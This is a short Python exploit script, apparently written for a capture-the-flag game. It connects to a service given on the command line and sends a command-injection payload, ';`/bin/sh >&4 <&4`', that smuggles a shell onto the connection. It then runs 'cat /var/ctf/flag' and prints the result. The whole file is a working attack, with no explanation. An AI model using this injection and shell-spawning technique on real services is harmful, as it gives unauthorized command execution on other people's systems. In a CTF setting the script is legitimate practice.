#!/usr/bin/env python

from socket import *
from time import sleep
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2])
BUFSIZE = 1024
ADDR = (HOST, PORT)

s = socket(AF_INET, SOCK_STREAM)
try:
	s.connect(ADDR)
except Exception as e:
	print('Cannot connect to the server.')
	sys.exit()

s.recv(BUFSIZE)
s.send("/ip ;`/bin/sh >&4 <&4`\n")
sleep(3)
s.send('cat /var/ctf/flag\n')
sleep(3)
flag = s.recv(BUFSIZE)
flag = flag.rstrip()
sys.stdout.write(flag)
